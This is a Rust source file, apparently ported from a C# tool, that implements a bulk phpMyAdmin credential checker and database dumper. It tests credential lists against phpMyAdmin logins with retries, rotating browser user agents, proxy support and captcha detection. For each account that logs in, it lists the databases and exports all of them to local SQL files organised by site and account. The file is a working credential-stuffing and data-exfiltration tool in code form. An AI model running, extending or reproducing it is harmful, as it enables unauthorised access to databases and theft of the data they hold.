// Source: C# PhpMyAdminClient (_tzYCdx01jabRi9YINoZruASmPDF.cs) ported to Rust.

use crate::html::{
    appears_logged_in, extract_databases, extract_db_select_options, extract_refresh_url,
    extract_set_session, extract_token, has_pma_auth_cookie, is_captcha_or_cloudflare,
    is_login_page, is_plausible_database_name, is_sql_dump, login_failed, login_succeeded,
    looks_like_phpmyadmin, uses_route_export,
};
use anyhow::{Context, Result, bail};
use crate::http_client::apply_proxy;
use pma_core::{output_file_path, Credential, ScanResult, ScanStatus};
use rand::seq::SliceRandom;
use reqwest::header::{HeaderMap, HeaderValue, ACCEPT, ACCEPT_LANGUAGE, CACHE_CONTROL, ORIGIN, REFERER};
use reqwest::{Client, RequestBuilder, Response};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::time::Duration;
use tokio::fs;
use tokio::io::AsyncWriteExt;
use tracing::{debug, warn};
use url::Url;

const CHROME_USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LoginOutcome {
    Good,
    Bad,
    Invalid,
    Captcha,
}

#[derive(Debug, Clone)]
pub struct PhpMyAdminClientConfig {
    pub timeout: Duration,
    pub export_timeout: Duration,
    pub user_agent: Option<String>,
    pub insecure: bool,
    pub login_retries: u32,
    /// HTTP(S) or SOCKS5 proxy
    pub proxy: Option<String>,
}

impl Default for PhpMyAdminClientConfig {
    fn default() -> Self {
        Self {
            timeout: Duration::from_secs(30),
            export_timeout: Duration::from_secs(60),
            user_agent: None,
            insecure: false,
            login_retries: 3,
            proxy: None,
        }
    }
}

impl PhpMyAdminClientConfig {
    pub fn effective_user_agent(&self) -> String {
        if let Some(ua) = &self.user_agent {
            return ua.clone();
        }
        let mut rng = rand::thread_rng();
        CHROME_USER_AGENTS
            .choose(&mut rng)
            .copied()
            .unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .to_string()
    }
}

pub struct PhpMyAdminClient {
    http: Client,
    export_timeout: Duration,
    base: Url,
    server: u32,
    token: Option<String>,
    use_routes: bool,
}

impl PhpMyAdminClient {
    pub fn new(base: Url, config: &PhpMyAdminClientConfig) -> Result<Self> {
        let user_agent = config.effective_user_agent();
        let timeout = config.export_timeout.max(config.timeout);
        let mut builder = Client::builder()
            .cookie_store(true)
            .redirect(reqwest::redirect::Policy::limited(10))
            .timeout(timeout)
            .user_agent(&user_agent);

        if config.insecure {
            builder = builder.danger_accept_invalid_certs(true);
        }

        let http = apply_proxy(builder, config.proxy.as_deref())?
            .build()
            .context("failed to build HTTP client")?;

        Ok(Self {
            http,
            export_timeout: config.export_timeout,
            base,
            server: 1,
            token: None,
            use_routes: false,
        })
    }

    fn join_path(&self, path: &str) -> Result<Url> {
        self.base.join(path).context("failed to join url path")
    }

    fn browser_headers(&self, referer: Option<&str>, ajax: bool) -> HeaderMap {
        let mut headers = HeaderMap::new();
        let accept = if ajax {
            "*/*"
        } else {
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        };
        headers.insert(ACCEPT, HeaderValue::from_static(accept));
        headers.insert(
            ACCEPT_LANGUAGE,
            HeaderValue::from_static("en-US,en;q=0.9"),
        );
        if !ajax {
            headers.insert(CACHE_CONTROL, HeaderValue::from_static("max-age=0"));
            headers.insert(ORIGIN, HeaderValue::from_static("null"));
        }
        if let Some(r) = referer {
            if let Ok(v) = HeaderValue::from_str(r) {
                headers.insert(REFERER, v);
            }
        }
        headers
    }

    fn apply_headers(&self, builder: RequestBuilder, referer: Option<&str>, ajax: bool) -> RequestBuilder {
        builder.headers(self.browser_headers(referer, ajax))
    }

    async fn read_response(resp: Response) -> Result<(String, Url, Vec<(String, String)>)> {
        let final_url = resp.url().clone();
        let cookies: Vec<(String, String)> = resp
            .cookies()
            .map(|c| (c.name().to_string(), c.value().to_string()))
            .collect();
        let text = resp.error_for_status()?.text().await?;
        Ok((text, final_url, cookies))
    }

    async fn get_text(&self, url: Url, referer: Option<&str>, ajax: bool) -> Result<(String, Url, Vec<(String, String)>)> {
        let req = self.apply_headers(self.http.get(url), referer, ajax);
        let resp = req.send().await?;
        Self::read_response(resp).await
    }

    async fn post_form(
        &self,
        client: &Client,
        url: Url,
        form: &[(&str, &str)],
        referer: Option<&str>,
        ajax: bool,
    ) -> Result<(String, Url, Vec<(String, String)>)> {
        self.post_form_with_timeout(client, url, form, referer, ajax, self.export_timeout)
            .await
    }

    async fn post_form_with_timeout(
        &self,
        client: &Client,
        url: Url,
        form: &[(&str, &str)],
        referer: Option<&str>,
        ajax: bool,
        timeout: Duration,
    ) -> Result<(String, Url, Vec<(String, String)>)> {
        let req = self.apply_headers(
            client.post(url).form(form).timeout(timeout),
            referer,
            ajax,
        );
        let resp = req.send().await?;
        Self::read_response(resp).await
    }

    pub async fn detect(&self) -> Result<bool> {
        for path in ["index.php", ""] {
            let url = if path.is_empty() {
                self.base.clone()
            } else {
                self.join_path(path)?
            };

            match self.get_text(url, None, false).await {
                Ok((html, _, _)) if looks_like_phpmyadmin(&html) => return Ok(true),
                Ok(_) => continue,
                Err(err) => {
                    debug!("detect probe failed: {err}");
                    continue;
                }
            }
        }
        Ok(false)
    }

    pub async fn login(&mut self, username: &str, password: &str) -> Result<LoginOutcome> {
        let login_url = self.normalize_login_url()?;
        let referer = login_url.as_str();
        let (html, _, _) = self.get_text(login_url.clone(), None, false).await?;

        if !looks_like_phpmyadmin(&html) {
            return Ok(LoginOutcome::Invalid);
        }

        let token = match extract_token(&html) {
            Some(t) => t,
            None => return Ok(LoginOutcome::Invalid),
        };

        let set_session = extract_set_session(&html);
        let server = self.server.to_string();
        let mut form: Vec<(&str, &str)> = vec![
            ("pma_username", username),
            ("pma_password", password),
            ("server", server.as_str()),
            ("lang", "en"),
            ("target", "index.php"),
            ("token", token.as_str()),
        ];

        let set_session_owned;
        if let Some(session) = set_session {
            set_session_owned = session;
            form.push(("set_session", set_session_owned.as_str()));
        }

        let post_req = self.apply_headers(
            self.http.post(login_url.clone()).form(&form),
            Some(referer),
            false,
        );
        let post_resp = post_req.send().await?;
        let refresh_header = post_resp
            .headers()
            .get("Refresh")
            .and_then(|v| v.to_str().ok())
            .map(str::to_string);
        let (mut body, mut final_url, mut cookies) = Self::read_response(post_resp).await?;

        if let Some(refresh) = refresh_header {
            if let Some(refresh_url) = extract_refresh_url(&refresh) {
                if let Ok(url) = Url::parse(&refresh_url) {
                    if let Ok((b, u, c)) = self.get_text(url, Some(referer), false).await {
                        body = b;
                        final_url = u;
                        cookies = c;
                    }
                }
            }
        }

        if login_failed(&body) || is_login_page(&body) {
            return Ok(LoginOutcome::Bad);
        }

        if is_captcha_or_cloudflare(&body) {
            return Ok(LoginOutcome::Captcha);
        }

        let authenticated =
            has_pma_auth_cookie(&cookies) || appears_logged_in(&html);
        if authenticated && !is_login_page(&body) {
            self.token = extract_token(&body).or(Some(token));
            self.use_routes = uses_route_export(&body);
            return Ok(LoginOutcome::Good);
        }

        if has_pma_auth_cookie(&cookies) && login_succeeded(&body, final_url.as_str()) {
            self.token = extract_token(&body).or(Some(token));
            self.use_routes = uses_route_export(&body);
            return Ok(LoginOutcome::Good);
        }

        Ok(LoginOutcome::Bad)
    }

    fn normalize_login_url(&self) -> Result<Url> {
        let mut url = self.join_path("index.php")?;
        if !url.path().ends_with("index.php") {
            url.set_path("/index.php");
        }
        Ok(url)
    }

    pub async fn list_databases(&self) -> Result<Vec<String>> {
        if let Ok(dbs) = self.list_databases_from_export_page().await {
            if !dbs.is_empty() {
                return Ok(dbs);
            }
        }

        let mut candidates = vec![
            self.join_path(&format!(
                "index.php?route=/server/databases&server={}",
                self.server
            ))?,
            self.join_path(&format!("navigation.php?server={}", self.server))?,
            self.join_path("db_structure.php")?,
        ];

        for url in candidates.drain(..) {
            match self.get_text(url, None, false).await {
                Ok((html, _, _)) => {
                    if is_login_page(&html) {
                        continue;
                    }
                    let dbs = extract_databases(&html);
                    if !dbs.is_empty() {
                        return Ok(dbs);
                    }
                }
                Err(err) => debug!("database list probe failed: {err}"),
            }
        }

        if let Ok(dbs) = self.show_databases_sql().await {
            if !dbs.is_empty() {
                return Ok(dbs);
            }
        }

        Ok(Vec::new())
    }

    async fn list_databases_from_export_page(&self) -> Result<Vec<String>> {
        let token = self
            .token
            .clone()
            .context("missing session token for export page")?;
        let referer = self.base.as_str();

        let (html, _, _) = if self.use_routes {
            let url = self.join_path(&format!(
                "index.php?route=/server/export&ajax_request=true&ajax_page_request=true&token={}",
                urlencoding_encode(&token)
            ))?;
            self.get_text(url, Some(referer), true).await?
        } else {
            let url = self.join_path("server_export.php")?;
            self.get_text(url, Some(referer), true).await?
        };

        Ok(extract_db_select_options(&html))
    }

    async fn show_databases_sql(&self) -> Result<Vec<String>> {
        let url = self.join_path("import.php")?;
        let (html, _, _) = self.get_text(url, None, false).await?;
        let token = extract_token(&html).context("missing token for SQL fallback")?;

        let sql_url = self.join_path("sql.php")?;
        let server = self.server.to_string();
        let form = [
            ("sql_query", "SHOW DATABASES"),
            ("server", server.as_str()),
            ("token", token.as_str()),
            ("goto", "sql.php"),
        ];

        let (body, _, _) = self.post_form(&self.http, sql_url, &form, None, false).await?;
        Ok(extract_databases(&body))
    }

    /// C# server-wide export: one `.sql` file containing all databases.
    pub async fn export_server_to_file(&self, output_path: &Path) -> Result<u64> {
        let token = self
            .token
            .clone()
            .context("missing session token for export")?;
        let referer = self.base.as_str();

        let export_page = if self.use_routes {
            self.join_path(&format!(
                "index.php?route=/server/export&ajax_request=true&ajax_page_request=true&token={}",
                urlencoding_encode(&token)
            ))?
        } else {
            self.join_path("server_export.php")?
        };

        let (page_html, _, _) = self.get_text(export_page, Some(referer), true).await?;
        if is_login_page(&page_html) {
            bail!("export page requires login (session not authenticated)");
        }
        let databases = extract_db_select_options(&page_html);
        if databases.is_empty() {
            bail!("no databases found on export page");
        }

        let export_token = extract_token(&page_html).unwrap_or(token);
        let export_url = if self.use_routes {
            self.join_path("index.php?route=/export")?
        } else {
            self.join_path("export.php")?
        };

        let mut form: Vec<(String, String)> = server_export_form(&export_token);
        for db in &databases {
            form.push(("db_select[]".into(), db.clone()));
        }

        let form_refs: Vec<(&str, &str)> = form.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
        let req = self.apply_headers(
            self.http
                .post(export_url)
                .form(&form_refs)
                .timeout(self.export_timeout),
            Some(referer),
            false,
        );
        let resp = req.send().await?;
        let bytes = resp.error_for_status()?.bytes().await?;
        let content = String::from_utf8_lossy(&bytes);
        if !is_sql_dump(&content) {
            if is_login_page(&content) {
                bail!("export returned login page instead of SQL");
            }
            bail!("export response is not a SQL dump");
        }

        if let Some(parent) = output_path.parent() {
            fs::create_dir_all(parent).await?;
        }
        let mut file = fs::File::create(output_path).await?;
        file.write_all(&bytes).await?;
        Ok(bytes.len() as u64)
    }

    pub async fn export_database(&self, database: &str) -> Result<String> {
        if !is_plausible_database_name(database) {
            bail!("{database} is not a plausible database name");
        }

        let token = match self.token.clone() {
            Some(t) => t,
            None => {
                let index_url = self.join_path("index.php")?;
                let (html, _, _) = self.get_text(index_url, None, false).await?;
                extract_token(&html).context("missing token for export")?
            }
        };

        let server = self.server.to_string();
        let referer = self.base.as_str();

        if self.use_routes {
            let route_export = self.join_path("index.php?route=/export")?;
            let route_form = vec![
                ("token", token.as_str()),
                ("export_type", "database"),
                ("export_method", "quick"),
                ("quick_or_custom", "quick"),
                ("db", database),
                ("what", "sql"),
                ("output_format", "sendit"),
                ("compression", "none"),
                ("sql_structure_or_data", "structure_and_data"),
                ("server", server.as_str()),
            ];
            let (route_body, _, _) = self
                .post_form_with_timeout(
                    &self.http,
                    route_export,
                    &route_form,
                    Some(referer),
                    false,
                    self.export_timeout,
                )
                .await?;
            if is_sql_dump(&route_body) {
                return Ok(route_body);
            }
            if is_login_page(&route_body) {
                bail!("export for {database} returned login page (auth failed)");
            }
            bail!("export for {database} did not return SQL");
        }

        let export_url = self.join_path("export.php")?;
        let form = vec![
            ("token", token.as_str()),
            ("export_type", "database"),
            ("export_method", "quick"),
            ("quick_or_custom", "quick"),
            ("db", database),
            ("single_table", "0"),
            ("sql_structure_or_data", "structure_and_data"),
            ("sql_query", ""),
            ("asfile", "on"),
            ("server", server.as_str()),
            ("go", "Go"),
        ];

        let (body, _, _) = self
            .post_form_with_timeout(
                &self.http,
                export_url,
                &form,
                Some(referer),
                false,
                self.export_timeout,
            )
            .await?;
        if is_sql_dump(&body) {
            return Ok(body);
        }
        if is_login_page(&body) {
            bail!("export for {database} returned login page (auth failed)");
        }

        bail!("export for {database} did not return SQL")
    }
}

fn server_export_form(token: &str) -> Vec<(String, String)> {
    vec![
        ("token".into(), token.into()),
        ("export_type".into(), "server".into()),
        ("export_method".into(), "quick".into()),
        ("template_id".into(), String::new()),
        ("quick_or_custom".into(), "quick".into()),
        ("what".into(), "sql".into()),
        ("output_format".into(), "sendit".into()),
        ("filename_template".into(), "@SERVER@".into()),
        ("remember_template".into(), "on".into()),
        ("charset".into(), "utf-8".into()),
        ("compression".into(), "none".into()),
        ("sql_structure_or_data".into(), "structure_and_data".into()),
        ("sql_type".into(), "INSERT".into()),
        ("sql_insert_syntax".into(), "both".into()),
        ("sql_include_comments".into(), "something".into()),
        ("sql_use_transaction".into(), "something".into()),
        ("sql_compatibility".into(), "NONE".into()),
        ("sql_create_table".into(), "something".into()),
        ("sql_auto_increment".into(), "something".into()),
        ("sql_create_view".into(), "something".into()),
        ("sql_create_trigger".into(), "something".into()),
        ("sql_backquotes".into(), "something".into()),
        ("sql_hex_for_binary".into(), "something".into()),
        ("sql_utc_time".into(), "something".into()),
    ]
}

fn urlencoding_encode(input: &str) -> String {
    input.bytes().fold(String::new(), |mut acc, b| {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                acc.push(b as char);
            }
            _ => {
                use std::fmt::Write;
                let _ = write!(acc, "%{b:02X}");
            }
        }
        acc
    })
}

pub async fn scan_credential(
    cred: &Credential,
    config: &PhpMyAdminClientConfig,
) -> ScanResult {
    match crate::http_client::try_http_https_for_cred(cred, |attempt| {
        scan_credential_inner(attempt, config)
    })
    .await
    {
        Ok(result) => result,
        Err(err) => ScanResult {
            credential: cred.clone(),
            status: ScanStatus::Error,
            message: Some(err.to_string()),
            databases: Vec::new(),
        },
    }
}

async fn scan_credential_inner(
    cred: Credential,
    config: &PhpMyAdminClientConfig,
) -> Result<ScanResult> {
    if cred.should_skip_short_credentials() {
        return Ok(ScanResult {
            credential: cred.clone(),
            status: ScanStatus::InvalidCredentials,
            message: Some("credentials too short for non-local host".into()),
            databases: Vec::new(),
        });
    }

    let mut client = PhpMyAdminClient::new(cred.url.clone(), config)?;

    let reachable = client.detect().await?;
    if !reachable {
        return Ok(ScanResult {
            credential: cred.clone(),
            status: ScanStatus::NotPhpMyAdmin,
            message: Some("no phpMyAdmin login page detected".into()),
            databases: Vec::new(),
        });
    }

    let mut last_outcome = LoginOutcome::Bad;
    let attempts = config.login_retries.max(1);
    for _ in 0..attempts {
        match client.login(&cred.username, &cred.password).await {
            Ok(LoginOutcome::Good) => {
                let databases = client.list_databases().await.unwrap_or_default();
                return Ok(ScanResult {
                    credential: cred.clone(),
                    status: ScanStatus::Valid,
                    message: None,
                    databases,
                });
            }
            Ok(outcome) => last_outcome = outcome,
            Err(err) => {
                return Ok(ScanResult {
                    credential: cred.clone(),
                    status: ScanStatus::Error,
                    message: Some(err.to_string()),
                    databases: Vec::new(),
                });
            }
        }
    }

    let status = match last_outcome {
        LoginOutcome::Invalid => ScanStatus::NotPhpMyAdmin,
        LoginOutcome::Captcha => ScanStatus::Captcha,
        LoginOutcome::Bad => ScanStatus::InvalidCredentials,
        LoginOutcome::Good => ScanStatus::Valid,
    };

    Ok(ScanResult {
        credential: cred.clone(),
        status,
        message: None,
        databases: Vec::new(),
    })
}

pub async fn dump_databases(
    cred: &Credential,
    config: &PhpMyAdminClientConfig,
    output_dir: &Path,
    databases: Option<&[String]>,
) -> Result<HashMap<String, PathBuf>> {
    fs::create_dir_all(output_dir).await?;

    let mut client = PhpMyAdminClient::new(cred.url.clone(), config)?;
    if client.login(&cred.username, &cred.password).await? != LoginOutcome::Good {
        bail!("login failed for {}", cred.display_line());
    }

    let site_dir = cred.account_site_output_dir(output_dir, "pma");
    let prefix = cred.account_file_prefix();

    // Prefer C#-style combined server export when no explicit DB list is provided.
    if databases.is_none() || databases.is_some_and(|d| d.is_empty()) {
        let leaf = format!("{prefix}__server.sql");
        let path = output_file_path(&site_dir, &leaf);
        match client.export_server_to_file(&path).await {
            Ok(bytes) => {
                let mut written = HashMap::new();
                written.insert("server".into(), path);
                debug!("server export wrote {bytes} bytes for {}", cred.display_line());
                return Ok(written);
            }
            Err(err) => {
                let msg = err.to_string();
                if msg.contains("login page") || msg.contains("not authenticated") {
                    bail!("authentication failed for {}: {msg}", cred.display_line());
                }
                warn!("server export failed, falling back to per-db: {err}");
            }
        }
    }

    let dbs = match databases {
        Some(list) if !list.is_empty() => list.to_vec(),
        _ => client.list_databases().await?,
    };

    if dbs.is_empty() {
        warn!("no databases found for {}", cred.url);
        return Ok(HashMap::new());
    }

    let mut written = HashMap::new();
    for db in dbs {
        match client.export_database(&db).await {
            Ok(sql) => {
                let leaf = format!(
                    "{}__{}.sql",
                    prefix,
                    Credential::safe_path_component(&db)
                );
                let path = output_file_path(&site_dir, &leaf);
                if let Some(parent) = path.parent() {
                    fs::create_dir_all(parent).await?;
                }
                let mut file = fs::File::create(&path).await?;
                file.write_all(sql.as_bytes()).await?;
                written.insert(db, path);
            }
            Err(err) => warn!("export failed for {db}: {err}"),
        }
    }

    Ok(written)
}

#[derive(Debug, Clone)]
pub struct PhpMyAdminAccountStats {
    pub username: String,
    pub databases: usize,
    pub downloaded: usize,
    pub bytes: u64,
}

impl PhpMyAdminAccountStats {
    pub fn detail_line(&self) -> String {
        let downloaded =
            crate::stats_display::file_count(self.downloaded, self.databases);
        format!(
            "user={} databases={} downloaded={downloaded} ({})",
            self.username,
            self.databases,
            format_pma_bytes(self.bytes)
        )
    }
}

fn format_pma_bytes(n: u64) -> String {
    if n >= 1_048_576 {
        format!("{:.1} MB", n as f64 / 1_048_576.0)
    } else if n >= 1024 {
        format!("{:.1} KB", n as f64 / 1024.0)
    } else {
        format!("{n} B")
    }
}

fn scan_failure_message(result: &ScanResult) -> String {
    if let Some(msg) = &result.message {
        return msg.clone();
    }
    match result.status {
        ScanStatus::NotPhpMyAdmin => "no phpMyAdmin login page detected".into(),
        ScanStatus::InvalidCredentials => "authentication failed".into(),
        ScanStatus::Captcha => "captcha required".into(),
        ScanStatus::Unreachable => "cannot reach host".into(),
        other => other.label().to_string(),
    }
}

pub async fn download_phpmyadmin_account(
    cred: &Credential,
    config: &PhpMyAdminClientConfig,
    output_dir: &Path,
    download_files: bool,
) -> Result<(PhpMyAdminAccountStats, Vec<(String, PathBuf, u64)>)> {
    crate::http_client::try_http_https_for_cred(cred, |attempt| {
        download_phpmyadmin_account_once(attempt, config, output_dir, download_files)
    })
    .await
}

async fn download_phpmyadmin_account_once(
    cred: Credential,
    config: &PhpMyAdminClientConfig,
    output_dir: &Path,
    download_files: bool,
) -> Result<(PhpMyAdminAccountStats, Vec<(String, PathBuf, u64)>)> {
    let scan = scan_credential_inner(cred.clone(), config).await?;
    if scan.status != ScanStatus::Valid {
        bail!(scan_failure_message(&scan));
    }
    let db_count = scan.databases.len();
    if db_count == 0 {
        bail!("no databases found in ui");
    }
    if !download_files {
        return Ok((
            PhpMyAdminAccountStats {
                username: cred.username.clone(),
                databases: db_count,
                downloaded: 0,
                bytes: 0,
            },
            Vec::new(),
        ));
    }

    let written = dump_databases(
        &cred,
        config,
        output_dir,
        Some(&scan.databases),
    )
    .await?;

    if written.is_empty() {
        bail!("phpMyAdmin: login ok but no SQL dumps saved");
    }

    let mut files = Vec::new();
    let mut total_bytes = 0u64;
    for (name, path) in written {
        let meta = fs::metadata(&path).await?;
        let n = meta.len();
        total_bytes += n;
        files.push((name, path, n));
    }

    Ok((
        PhpMyAdminAccountStats {
            username: cred.username.clone(),
            databases: db_count,
            downloaded: files.len(),
            bytes: total_bytes,
        },
        files,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encodes_database_names() {
        assert_eq!(urlencoding_encode("my db"), "my%20db");
    }
}
